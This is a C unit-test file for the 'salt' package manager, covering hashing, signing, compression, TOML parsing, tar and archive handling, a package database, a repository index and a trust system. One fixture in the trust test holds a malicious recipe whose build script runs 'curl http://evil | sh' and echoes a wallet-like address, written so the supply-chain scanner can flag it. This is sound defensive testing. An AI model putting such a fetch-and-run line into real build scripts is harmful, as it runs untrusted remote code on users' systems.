#include "salt/util.h"
#include "salt/hash.h"
#include "salt/sign.h"
#include "salt/zst.h"
#include "salt/toml.h"
#include "salt/tar.h"
#include "salt/pkg.h"
#include "salt/archive.h"
#include "salt/db.h"
#include "salt/repo.h"
#include "salt/trust.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int g_fail = 0;
static int g_total = 0;

#define CHECK(cond, msg)                              \
  do {                                                \
    g_total++;                                        \
    if (!(cond)) {                                    \
      printf("FAIL: %s (%s:%d)\n", msg, __FILE__, __LINE__); \
      g_fail++;                                       \
    }                                                 \
  } while (0)

static void test_buf(void) {
  salt_buf b;
  salt_buf_init(&b);
  salt_buf_append_str(&b, "hello");
  salt_buf_printf(&b, " %d %s", 42, "world");
  CHECK(strcmp(b.data, "hello 42 world") == 0, "buf printf");
  salt_buf_free(&b);
}

static void test_strlist(void) {
  salt_strlist l;
  salt_strlist_init(&l);
  salt_strlist_push(&l, "a");
  salt_strlist_push(&l, "b");
  CHECK(l.len == 2, "strlist len");
  CHECK(salt_strlist_contains(&l, "a"), "strlist contains");
  CHECK(!salt_strlist_contains(&l, "z"), "strlist not contains");
  salt_strlist_free(&l);
}

static void test_sha256(void) {
  char hex[SALT_SHA256_HEXLEN + 1];
  salt_sha256_buf("abc", 3, hex);
  CHECK(strcmp(hex, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
        "sha256 abc");
}

static void test_sign(void) {
  char pub[SALT_PUBKEY_HEXLEN + 1], sec[SALT_SECKEY_HEXLEN + 1], sig[SALT_SIG_HEXLEN + 1];
  CHECK(salt_keypair_generate(pub, sec) == SALT_OK, "keygen");
  const char *msg = "the quick brown fox";
  CHECK(salt_sign_buf(msg, strlen(msg), sec, sig) == SALT_OK, "sign");
  CHECK(salt_verify_buf(msg, strlen(msg), sig, pub) == SALT_OK, "verify ok");
  CHECK(salt_verify_buf("tampered", 8, sig, pub) != SALT_OK, "verify fail");
}

static void test_zst(void) {
  const char *data = "saltOS saltOS saltOS saltOS saltOS compress me please please please";
  salt_buf comp, dec;
  CHECK(salt_zst_compress(data, strlen(data), 19, &comp) == SALT_OK, "zst compress");
  CHECK(salt_zst_decompress(comp.data, comp.len, &dec) == SALT_OK, "zst decompress");
  CHECK(dec.len == strlen(data) && memcmp(dec.data, data, dec.len) == 0, "zst roundtrip");
  salt_buf_free(&comp);
  salt_buf_free(&dec);
}

static void test_toml(void) {
  const char *src =
      "name = \"zlib\"\n"
      "version = \"1.3.1\"\n"
      "release = 2\n"
      "arch = [\"x86_64\", \"aarch64\"]\n"
      "enabled = true\n"
      "[source]\n"
      "url = \"https://example.com/z.tar.gz\"\n"
      "[build]\n"
      "script = \"\"\"\nmake\nmake install\n\"\"\"\n"
      "[[package]]\nname = \"a\"\n[[package]]\nname = \"b\"\n";
  salt_toml *t = salt_toml_parse(src, strlen(src));
  CHECK(t != NULL, "toml parse");
  CHECK(strcmp(salt_toml_string(t, "name", ""), "zlib") == 0, "toml string");
  CHECK(salt_toml_int(t, "release", 0) == 2, "toml int");
  CHECK(salt_toml_bool(t, "enabled", false) == true, "toml bool");
  CHECK(strcmp(salt_toml_string(t, "source.url", ""), "https://example.com/z.tar.gz") == 0,
        "toml nested");
  salt_strlist arch;
  salt_strlist_init(&arch);
  salt_toml_string_array(t, "arch", &arch);
  CHECK(arch.len == 2 && strcmp(arch.items[1], "aarch64") == 0, "toml array");
  salt_strlist_free(&arch);
  const char *script = salt_toml_string(t, "build.script", "");
  CHECK(strstr(script, "make install") != NULL, "toml multiline");
  const salt_toml *pkgs = salt_toml_get(t, "package");
  CHECK(salt_toml_array_len(pkgs) == 2, "toml array-of-tables");
  salt_toml_free(t);
}

static void test_pkg_roundtrip(void) {
  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("zlib");
  m.version = salt_strdup("1.3.1");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.summary = salt_strdup("Compression");
  m.license = salt_strdup("Zlib");
  m.repro_status = salt_strdup("verified");
  salt_strlist_push(&m.deps, "glibc");
  salt_buf out;
  salt_pkg_meta_to_toml(&m, &out);
  salt_pkg_meta m2;
  salt_pkg_meta_from_toml(out.data, out.len, &m2);
  CHECK(strcmp(m2.name, "zlib") == 0 && m2.release == 1, "meta roundtrip");
  CHECK(m2.deps.len == 1 && strcmp(m2.deps.items[0], "glibc") == 0, "meta deps");
  char *fn = salt_pkg_filename(&m);
  CHECK(strcmp(fn, "zlib-1.3.1-1-x86_64.saltpkg") == 0, "pkg filename");
  free(fn);
  salt_buf_free(&out);
  salt_pkg_meta_free(&m);
  salt_pkg_meta_free(&m2);
}

static void test_tar(void) {
  salt_buf out;
  salt_buf_init(&out);
  salt_tar_writer *w = salt_tar_writer_new(&out);
  const char *content = "file body";
  salt_tar_entry e = {"usr/share/long/path/to/a/file.txt", SALT_TAR_FILE, 0644, strlen(content),
                      NULL, content};
  salt_tar_writer_add(w, &e);
  salt_tar_writer_finish(w);
  salt_tar_writer_free(w);

  char tmp[] = "/tmp/salt_tar_XXXXXX";
  char *d = mkdtemp(tmp);
  CHECK(d != NULL, "mkdtemp");
  salt_strlist inst;
  salt_strlist_init(&inst);
  CHECK(salt_tar_extract(out.data, out.len, d, &inst) == SALT_OK, "tar extract");
  char *full = salt_join_path(d, "usr/share/long/path/to/a/file.txt");
  salt_buf rd;
  CHECK(salt_read_file(full, &rd) == SALT_OK, "tar extracted file exists");
  CHECK(rd.len == strlen(content) && memcmp(rd.data, content, rd.len) == 0, "tar content");
  salt_buf_free(&rd);
  free(full);
  salt_strlist_free(&inst);
  salt_buf_free(&out);
  salt_remove_recursive(d);
}

static void test_archive_db(void) {
  char tmp[] = "/tmp/salt_arch_XXXXXX";
  char *d = mkdtemp(tmp);
  char *staging = salt_join_path(d, "staging");
  char *binp = salt_join_path(staging, "usr/bin/hello");
  salt_write_file(binp, "#!/bin/sh\necho hi\n", 18, 0755);
  char *etcp = salt_join_path(staging, "etc/hello.conf");
  salt_write_file(etcp, "k=v\n", 4, 0644);

  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("hello");
  m.version = salt_strdup("1.0");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.license = salt_strdup("MIT");
  m.repro_status = salt_strdup("verified");

  salt_archive ar;
  CHECK(salt_archive_build_from_dir(staging, &m, NULL, &ar) == SALT_OK, "archive build");
  CHECK(ar.manifest.len >= 2, "archive manifest");
  char *pkgpath = salt_join_path(d, "hello-1.0-1-x86_64.saltpkg");
  CHECK(salt_archive_write(&ar, pkgpath) == SALT_OK, "archive write");

  salt_archive ar2;
  CHECK(salt_archive_open(pkgpath, &ar2) == SALT_OK, "archive open");
  CHECK(strcmp(ar2.meta.name, "hello") == 0, "archive meta");

  char *root = salt_join_path(d, "root");
  salt_strlist inst;
  salt_strlist_init(&inst);
  CHECK(salt_archive_extract_payload(&ar2, root, &inst) == SALT_OK, "archive extract");
  char *installed_bin = salt_join_path(root, "usr/bin/hello");
  CHECK(salt_path_exists(installed_bin), "extracted bin exists");

  char *dbp = salt_join_path(d, "db.sqlite");
  salt_db *db;
  CHECK(salt_db_open(dbp, &db) == SALT_OK, "db open");
  int64_t txn;
  salt_db_txn_new(db, "install", &txn);
  CHECK(salt_db_record_install(db, &ar2.meta, &ar2.manifest, "current", "signed", txn) == SALT_OK,
        "db record install");
  salt_db_txn_finish(db, txn, "ok");
  CHECK(salt_db_is_installed(db, "hello"), "db installed");
  char *owner = NULL;
  CHECK(salt_db_owner(db, "usr/bin/hello", &owner) == SALT_OK && strcmp(owner, "hello") == 0,
        "db owner");
  free(owner);
  salt_strlist files;
  salt_strlist_init(&files);
  salt_db_pkg_files(db, "hello", &files);
  CHECK(files.len >= 2, "db files");
  salt_strlist_free(&files);
  CHECK(salt_db_record_remove(db, "hello", txn) == SALT_OK, "db remove");
  CHECK(!salt_db_is_installed(db, "hello"), "db removed");
  salt_db_close(db);

  salt_strlist_free(&inst);
  salt_archive_free(&ar);
  salt_archive_free(&ar2);
  salt_pkg_meta_free(&m);
  free(staging);
  free(binp);
  free(etcp);
  free(pkgpath);
  free(root);
  free(installed_bin);
  free(dbp);
  salt_remove_recursive(d);
}

static void test_repo(void) {
  char tmp[] = "/tmp/salt_repo_XXXXXX";
  char *d = mkdtemp(tmp);
  char *pkgdir = salt_join_path(d, "packages");
  char *staging = salt_join_path(d, "st");
  char *f = salt_join_path(staging, "usr/bin/x");
  salt_write_file(f, "x", 1, 0755);
  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("x");
  m.version = salt_strdup("1");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.license = salt_strdup("MIT");
  m.repro_status = salt_strdup("verified");
  salt_archive ar;
  salt_archive_build_from_dir(staging, &m, NULL, &ar);
  char *pp = salt_join_path(pkgdir, "x-1-1-x86_64.saltpkg");
  salt_archive_write(&ar, pp);

  salt_repo_index idx;
  CHECK(salt_repo_build_index(pkgdir, "current", "x86_64", &idx) == SALT_OK, "repo build index");
  CHECK(idx.len == 1 && strcmp(idx.items[0].name, "x") == 0, "repo index entry");
  CHECK(strlen(idx.items[0].sha256) == 64, "repo index sha");

  salt_buf toml;
  salt_repo_index_to_toml(&idx, &toml);
  char *idxpath = salt_join_path(d, "index.toml");
  salt_write_file(idxpath, toml.data, toml.len, 0644);
  salt_repo_index loaded;
  CHECK(salt_repo_index_load(idxpath, &loaded) == SALT_OK, "repo index load");
  CHECK(loaded.len == 1, "repo index reload");
  CHECK(salt_repo_index_find(&loaded, "x") != NULL, "repo index find");

  salt_buf_free(&toml);
  salt_repo_index_free(&idx);
  salt_repo_index_free(&loaded);
  salt_archive_free(&ar);
  salt_pkg_meta_free(&m);
  free(pkgdir);
  free(staging);
  free(f);
  free(pp);
  free(idxpath);
  salt_remove_recursive(d);
}

static void test_trust(void) {
  char tmp[] = "/tmp/salt_trust_XXXXXX";
  char *d = mkdtemp(tmp);
  char *tdb = salt_join_path(d, "trust.toml");
  salt_trust_set(tdb, "root", SALT_TRUST_MAINTAINER, "self", "founder");
  CHECK(salt_trust_lookup(tdb, "root") == SALT_TRUST_MAINTAINER, "trust set/lookup");
  CHECK(salt_trust_vouch(tdb, "root", "alice", "good work") == SALT_OK, "trust vouch");
  CHECK(salt_trust_lookup(tdb, "alice") == SALT_TRUST_VOUCHED, "trust vouched level");
  CHECK(salt_trust_lookup(tdb, "nobody") == SALT_TRUST_UNKNOWN, "trust unknown");

  char *rdir = salt_join_path(d, "recipe");
  char *rfile = salt_join_path(rdir, "recipe.toml");
  const char *good =
      "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\",\"aarch64\"]\n"
      "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\n"
      "sha256=\"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\"\n"
      "[build]\ndeps=[\"gcc\"]\n[reproducibility]\nstatus=\"verified\"\n";
  salt_write_file(rfile, good, strlen(good), 0644);
  salt_findings lf;
  salt_findings_init(&lf);
  salt_recipe_lint(rdir, &lf);
  CHECK(!salt_findings_has_block(&lf), "lint clean recipe");
  salt_findings_free(&lf);

  const char *bad =
      "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\"]\n"
      "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\nsha256=\"x\"\n"
      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho 0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
  salt_write_file(rfile, bad, strlen(bad), 0644);
  salt_findings sf;
  salt_findings_init(&sf);
  salt_scan_input in;
  memset(&in, 0, sizeof(in));
  in.recipe_path = rdir;
  in.author_level = SALT_TRUST_UNKNOWN;
  salt_supplychain_scan(&in, &sf);
  CHECK(salt_findings_has_block(&sf), "scan flags wallet/block");
  salt_findings_free(&sf);

  free(tdb);
  free(rdir);
  free(rfile);
  salt_remove_recursive(d);
}

int main(void) {
  test_buf();
  test_strlist();
  test_sha256();
  test_sign();
  test_zst();
  test_toml();
  test_pkg_roundtrip();
  test_tar();
  test_archive_db();
  test_repo();
  test_trust();
  printf("\n%d/%d checks passed\n", g_total - g_fail, g_total);
  return g_fail ? 1 : 0;
}
